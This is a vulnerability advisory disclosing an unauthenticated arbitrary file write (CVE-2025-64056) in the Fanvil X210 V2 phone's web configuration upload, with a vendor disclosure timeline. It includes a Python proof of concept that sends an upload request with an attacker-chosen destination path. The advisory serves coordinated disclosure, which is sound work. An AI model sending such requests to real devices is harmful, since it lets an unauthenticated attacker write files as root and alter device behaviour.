# Unauthenticated Arbitrary File Write in Fanvil x210 V2 (CVE-2025-64056)
## Summary
We identified an arbitrary file write vulnerability that permits unauthenticated attackers on the local network to store arbitrary files on the filesystem. Given the potential of this vulnerability to modify the file system, there is a risk that attackers could modify the normal behavior of the device.

## Affected products
- Fanvil x210 V2, firmware V2.12.20

## Details
During an analysis of the latest Fanvil X210 firmware (`X210-V2-2.12.20`, dated **2024-07-30**), a critical security issue was identified. The device’s web application, used for configuration, allows an **unauthenticated attacker on the local network** to write arbitrary files to the system.

The web application includes functionality for uploading **custom fonts and translation files**, which are stored in two specific locations:
- **`/etc`** – Destination for font files
- **`/userdata/resources/land`** – Destination for translation files

This behavior is evident from both the **web interface** and the **HTTP upload request**.

By reverse engineering the extracted `webconfig` file from the firmware, it was confirmed that **the target path is neither validated nor sanitized properly**. Further investigation of startup scripts (`rc.d`, `init.d`) and the `httpd` server configuration revealed that the **web service runs as the root user**.

Due to the **lack of validation** and the **service running with root privileges**, an attacker can inject arbitrary paths into the upload request, effectively **writing arbitrary files anywhere on the system**.

## PoC
```python
#!/usr/bin/python3
import requests
from time import sleep

IP="192.168.122.246"
PORT="8080"
UPLOAD_URL=f"http://{IP}:{PORT}/cgi-bin/webconfig?page=upload&action=submit"
SCRIPT_FILE="./test.txt"

with open(SCRIPT_FILE, 'rb') as f:
	multipart_form_data = {
		'upload/newfile': ('test.txt', f, 'application/octet-stream'),
		'upload/dest': (None, '/tmp')
	}
	headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0'}

	response = requests.post(UPLOAD_URL, files=multipart_form_data, headers=headers)
	print(response.status_code)
```

## Impact
By exploiting this vulnerability, attackers can modify the file system of the device and alter its normal behavior.

## Additional information
Issue fixed on firmware version 2.12.22.2

## Credits
Spike Reply Cybersecurity Team

## Disclosure timeline
- 01/03/2025: Vulnerability discovered
- 04/03/2025: Initial contact with vendor
- 06/03/2025: Technical details shared with vendor
- 25/04/2025: Disclosure date agreed with vendor (June 6, 2025)
- 14/05/2025: Vendor reports inability to reproduce this and other reported issues
- 06/06/2025: Team informs vendor they are retesting on firmware v2.12.22.2, released after initial contact (April 28, 2025)
- 09/06/2025: Vendor investigates whether web server changes in new firmware address the issues
- 25/06/2025: Team requests update - no response
- 07/07/2025: Follow-up request sent - still no response
- 16/07/2025: Team sends another follow-up and sets new disclosure date (July 28, 2025) - no response
- 25/11/2025: Disclosure
